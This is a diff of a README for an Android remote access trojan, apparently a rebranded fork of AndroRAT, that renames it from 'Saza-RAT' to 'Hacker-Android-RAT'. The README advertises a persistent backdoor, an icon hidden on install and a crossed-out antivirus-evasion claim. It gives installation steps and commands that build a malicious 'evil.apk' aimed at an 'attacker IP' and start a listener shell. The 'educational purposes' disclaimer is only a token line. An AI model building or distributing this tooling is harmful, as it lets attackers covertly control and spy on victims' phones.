@@ -1,5 +1,5 @@
 **Disclaimer** : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.
-# Saza-RAT 
+# Hacker-Android-RAT 
    ## Developer
 <p align="left">
   <img src="Screenshots/saza.jpg" width="150" height="150"/>
@@ -11,19 +11,17 @@
 ------------------------------------------------------------------------------------------------------------------------------
 
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) 
-[![Twitter Follow](https://img.shields.io/twitter/follow/karma9874?label=Follow&style=social)](https://twitter.com/karma9874)
-[![GitHub followers](https://img.shields.io/github/followers/karma9874?label=Follow&style=social)](https://github.com/karma9874)
+[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) 4)
 
 AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.
 
 ##### Saza-RAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)
 
-> Saza-RAT also works on Android 10 (Q) but some of the interpreter command will be unstable. 
+> Hacker-Android-RAT also works on Android 10 (Q) but some of the interpreter command will be unstable. 
 
 ## Screenshots
 
-* Saza-RAT In Action
+* Hacker-Android-RAT In Action
 <p align="left">
   <img src="Screenshots/5.png" width="800"/>
 </p>
@@ -31,7 +29,7 @@ AndroRAT is a tool designed to give the control of the android system remotely a
 
 ------------------------------------------------------------------------------------------------------------------------------
 
-## Features of Saza-RAT 
+## Features of Hacker-Android-RAT
 * Full persistent backdoor
 * ~~Fully undetectable by any antivirus scanner [VirusTotal](https://www.virustotal.com/gui/file/e900b5d37ad8c8f79ca000b148253af04696a85fdfc245861cfb226dd86562df/detection)~~
 * Invisible icon on install
@@ -43,12 +41,12 @@ AndroRAT is a tool designed to give the control of the android system remotely a
 
 
 ## Prerequisites
-Saza-RAT requires Python3 and JAVA (or Android Studio)
+Hacker-Android-RAT requires Python3 and JAVA (or Android Studio)
 
 ## Installation
 ```
-git clone https://github.com/felixwanjala001/Saza-RAT.git
-cd Saza-RAT
+git clone https://github.com/felixwanjala001/Hacker-Android-RAT.git
+cd Hacker-Android-RAT
 pip install -r requirements.txt
 ```
 #### Note: 
@@ -77,7 +75,7 @@ You must run Git bash with administrator privileges.
 
 ```
 Usage:
-  python3 Saza-RAT.py --build --ngrok [flags]
+  python3 Hacker-Android-RAT.py --build --ngrok [flags]
   Flags:
     -p, --port              Attacker port number (optional by default its set to 8000)
     -o, --output            Name for the apk file (optional by default its set to "karma.apk")
@@ -86,7 +84,7 @@ Usage:
 
 ```
 Usage:
-  python3 Saza-RAT.py --build [flags]
+  python3 Hacker-Android-RAT.py --build [flags]
   Flags:
     -i, --ip                Attacker IP address (required)
     -p, --port              Attacker port number (required)
@@ -98,7 +96,7 @@ Or you can manually build the apk by importing [Android Code](Android_Code) fold
 ### `shell` mode
 ```
 Usage:
-  python3 Saza-RAT.py --shell [flags]
+  python3 Hacker-Android-RAT.py --shell [flags]
   Flags:
     -i, --ip                Listner IP address
     -p, --port              Listner port number
@@ -135,13 +133,13 @@ In the sh shell there are some sub commands
 ## Examples
 
 * To build the apk using ngrok which will also set the listner:
-```python3 Saza-RAT.py --build --ngrok -o evil.apk```
+```python3 Hacker-Android-RAT.py --build --ngrok -o evil.apk```
 
 * To build the apk using desired ip and port:
-```python3 Saza-RAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
+```python3 Hacker-Android-RAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
 
 * To get the interpreter:
-```python3 Saza-RAT.py --shell -i 0.0.0.0 -p 8000```
+```python3 Hacker-Android-RAT.py --shell -i 0.0.0.0 -p 8000```
 
 ## Interpreter Examples
 * Generating APK
